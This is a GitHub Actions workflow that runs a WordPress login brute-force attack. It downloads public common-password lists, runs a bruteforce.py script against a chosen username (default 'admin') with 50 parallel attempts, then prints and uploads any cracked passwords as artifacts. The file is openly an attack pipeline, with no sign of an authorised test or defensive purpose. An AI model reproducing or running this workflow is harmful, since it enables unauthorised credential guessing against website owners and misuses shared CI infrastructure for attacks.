name: WordPress Brute Force

on:
  workflow_dispatch:
    inputs:
      wordlist:
        description: 'Wordlist to use'
        required: true
        default: 'common'
        type: choice
        options:
          - common
          - top100
          - top1000
      username:
        description: 'Target username'
        required: false
        default: 'admin'

jobs:
  bruteforce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install requests

      - name: Prepare wordlist
        run: |
          if [ "${{ inputs.wordlist }}" = "common" ]; then
            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -o wordlist.txt
          elif [ "${{ inputs.wordlist }}" = "top100" ]; then
            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-100.txt" -o wordlist.txt
          elif [ "${{ inputs.wordlist }}" = "top1000" ]; then
            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-1000.txt" -o wordlist.txt
          fi
          echo "Wordlist ready: $(wc -l < wordlist.txt) passwords"

      - name: Run brute force
        run: |
          python3 bruteforce.py \
            -w wordlist.txt \
            -u ${{ inputs.username }} \
            -o found.txt \
            -b 50

      - name: Display results
        if: always()
        run: |
          if [ -f found.txt ]; then
            echo "=== RESULTS ==="
            cat found.txt
          else
            echo "No password found in this wordlist."
          fi

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: bruteforce-results-${{ inputs.wordlist }}
          path: |
            found.txt
            wordlist.txt
          retention-days: 7
